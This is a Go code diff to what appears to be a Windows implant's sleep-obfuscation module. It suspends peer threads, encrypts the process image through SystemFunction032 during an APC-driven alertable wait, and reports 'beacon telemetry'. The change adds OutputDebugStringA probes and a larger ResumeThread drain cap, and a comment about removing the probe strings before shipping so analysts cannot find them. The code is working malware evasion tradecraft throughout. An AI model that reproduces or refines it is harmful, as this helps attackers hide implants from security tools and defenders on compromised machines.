@@ -72,9 +72,19 @@ const (
 	// no timeout — we use a fixed short delay instead.
 	commitDelayMs int64 = 5
 
-	// ResumeThread drain cap: no thread should legitimately reach 32
-	// stacked suspensions; this is a runaway backstop.
-	maxResumeDrain = 32
+	// ResumeThread drain cap. Bumped from 32 to 1024 after we observed a
+	// hang whose signature was "peer Ms permanently OS-suspended with
+	// near-zero CPU time." One hypothesis is that Go's sysmon and any
+	// other concurrent-suspend source (a security product, kernel worker,
+	// etc.) can race harder with our own SuspendThread than 32 iterations
+	// covers. 1024 is well below MAXIMUM_SUSPEND_COUNT (0x7F) times any
+	// realistic race count and still a bounded runaway backstop.
+	maxResumeDrain = 1024
+
+	// apcDebug gates OutputDebugStringA probes throughout this package.
+	// Set to false and rebuild before shipping — the probe format strings
+	// live in .rdata and are trivially discoverable with `strings`.
+	apcDebug = true
 
 	// DWORD (uint32) representation of -1, cast to uintptr. SuspendThread
 	// and ResumeThread return DWORD; on failure they return (DWORD)-1
@@ -92,6 +102,7 @@ var (
 	procQueueUserAPC     = kernel32.NewProc("QueueUserAPC")
 	procSuspendThread    = kernel32.NewProc("SuspendThread")
 	procResumeThread     = kernel32.NewProc("ResumeThread")
+	procOutputDebugStringA = kernel32.NewProc("OutputDebugStringA")
 
 	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
 	procNtDelayExecution         = ntdll.NewProc("NtDelayExecution")
@@ -112,6 +123,24 @@ var (
 // beacon telemetry to detect a host on which APC-based sleep is failing.
 func Stats() (cycles, errors uint64) {
 	return cyclesTotal.Load(), errorsTotal.Load()
+}
+
+// dbg emits a line to any attached debugger (DbgView with global capture,
+// WinDbg, etc.) via OutputDebugStringA. Silently dropped by the kernel
+// when no debugger is present, so cheap in normal operation — but the
+// format strings live in .rdata, so gate at compile time (apcDebug=false)
+// before shipping.
+func dbg(format string, args ...any) {
+	if !apcDebug {
+		return
+	}
+	msg := fmt.Sprintf("[apc] "+format+"\n", args...)
+	p, err := windows.BytePtrFromString(msg)
+	if err != nil {
+		return
+	}
+	procOutputDebugStringA.Call(uintptr(unsafe.Pointer(p)))
+	runtime.KeepAlive(p)
 }
 
 // ustring matches the informal SystemFunction032 argument type
@@ -243,6 +272,7 @@ func init() {
 	for _, p := range []*syscall.LazyProc{
 		procGetModuleHandleA, procVirtualAlloc, procVirtualFree,
 		procVirtualProtect, procQueueUserAPC, procSuspendThread, procResumeThread,
+		procOutputDebugStringA,
 		procNtDelayExecution, procNtWaitForSingleObject, procNtQueryInformationThread,
 		procSystemFunction032,
 	} {
@@ -343,19 +373,51 @@ func suspendImagePeers(currentTID uint32, imageBase, imageEnd uintptr) ([]uint32
 // the thread has exited between the suspend pass and now, so there is
 // nothing to resume. We must keep going through the rest of the list
 // unconditionally.
-func resumePeers(tids []uint32) {
+//
+// The `cycle` argument is only used for debug probes; passing 0 is fine
+// when the caller doesn't have a cycle number to report.
+func resumePeers(cycle uint64, tids []uint32) {
+	openFail := 0
+	extraDrainsTotal := 0
+	capHits := 0
 	for _, tid := range tids {
 		hThread, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, tid)
 		if err != nil {
+			openFail++
+			dbg("cycle=%d resume OpenThread failed tid=%d err=%v", cycle, tid, err)
 			continue
 		}
-		for i := 0; i < maxResumeDrain; i++ {
+		var drains int
+		var lastR uintptr
+		for drains = 0; drains < maxResumeDrain; drains++ {
 			r, _, _ := procResumeThread.Call(uintptr(hThread))
+			lastR = r
 			if r == 0 || r == 1 || r == dwordMinusOne {
 				break
 			}
 		}
+		if drains > 1 {
+			// This is the diagnostic we most want. lastR is the previous
+			// count at the LAST Resume call — if drains hit the cap and
+			// lastR > 1, the thread is likely still suspended and we
+			// are the "cannot drain" case that produces the hang.
+			dbg("cycle=%d tid=%d drained=%d lastR=%d%s",
+				cycle, tid, drains, lastR,
+				func() string {
+					if drains == maxResumeDrain && lastR > 1 {
+						capHits++
+						return " CAP_HIT_STILL_SUSPENDED"
+					}
+					return ""
+				}(),
+			)
+			extraDrainsTotal += drains - 1
+		}
 		windows.CloseHandle(hThread)
+	}
+	if openFail > 0 || extraDrainsTotal > 0 || capHits > 0 {
+		dbg("cycle=%d resume summary: openFail=%d extraDrainsTotal=%d capHits=%d",
+			cycle, openFail, extraDrainsTotal, capHits)
 	}
 }
 
@@ -379,7 +441,9 @@ func Sleep(sleepMs uint64) error {
 	if sleepMs == 0 {
 		return nil
 	}
-	cyclesTotal.Add(1)
+	cycle := cyclesTotal.Add(1)
+	dbg("cycle=%d enter Sleep sleepMs=%d cyclesTotal=%d errors=%d",
+		cycle, sleepMs, cycle, errorsTotal.Load())
 
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
@@ -471,8 +535,10 @@ func Sleep(sleepMs uint64) error {
 	suspendedTIDs, err := suspendImagePeers(currentTID, imageBase, imageEnd)
 	if err != nil {
 		errorsTotal.Add(1)
+		dbg("cycle=%d suspendImagePeers err=%v", cycle, err)
 		return err
 	}
+	dbg("cycle=%d suspend done tids=%d currentTID=%d", cycle, len(suspendedTIDs), currentTID)
 
 	// SuspendThread is asynchronous — give the kernel a moment to commit
 	// each suspension before we start mutating the image. Without this,
@@ -494,10 +560,12 @@ func Sleep(sleepMs uint64) error {
 		// Never entered the encrypted window — safe to resume immediately
 		// and bail. Failing to resume peers here would leave the process
 		// deadlocked with no way out.
-		resumePeers(suspendedTIDs)
+		dbg("cycle=%d QueueUserAPC returned 0", cycle)
+		resumePeers(cycle, suspendedTIDs)
 		errorsTotal.Add(1)
 		return errors.New("apc: QueueUserAPC failed")
 	}
+	dbg("cycle=%d entering alertable wait", cycle)
 
 	// Enter the alertable wait. The kernel notices the queued APC,
 	// dispatches the trampoline (which runs the whole encrypt/sleep/
@@ -515,9 +583,12 @@ func Sleep(sleepMs uint64) error {
 		0, // Timeout = NULL (INFINITE)
 	)
 
+	dbg("cycle=%d alertable wait returned", cycle)
+
 	// -------- RESUME PEER GO Ms --------
 	// Image is decrypted and executable again; peers are safe to run.
-	resumePeers(suspendedTIDs)
+	resumePeers(cycle, suspendedTIDs)
+	dbg("cycle=%d Sleep returning", cycle)
 
 	// Keep the buffers referenced through the unmanaged execution above.
 	// Go's escape analysis handles &args and &keyBuf, but an explicit
